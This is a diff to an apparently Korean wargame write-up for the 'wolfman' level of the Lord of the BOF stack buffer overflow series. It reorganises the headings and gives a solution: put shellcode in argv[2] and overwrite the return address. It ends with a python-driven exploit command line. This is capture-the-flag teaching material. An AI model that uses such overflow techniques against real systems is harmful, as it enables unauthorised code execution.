@@ -4,7 +4,8 @@ categories: [Wargame, BOF]
 tags: [stack buffer overflow]
 ---
 
-## 1. Source Code
+## wolfman
+---
 ```c
 /*
         The Lord of the BOF : The Fellowship of the BOF
@@ -50,10 +51,13 @@ main(int argc, char *argv[])
         memset(buffer, 0, 40);
 }
 ```
-## 2. Vulnerability
+<br>
+<br>
+
+## Solution
+---
 argv[1]의 길이가 48로 제한되어 있음. 그래서 argv[2]를 이용해서 쉘코드를 넣으면 됨.
 
-## 3. Solution
 우선 argv[2] 주소를 찾아 리턴주소로 해주고 argv[2]로 쉘코드를 주면 됨.
 ```
 ./test `python -c 'print "A"*44+"BBB\xbf"'` `python -c 'print "C"*44+"DDD\xbf"'`
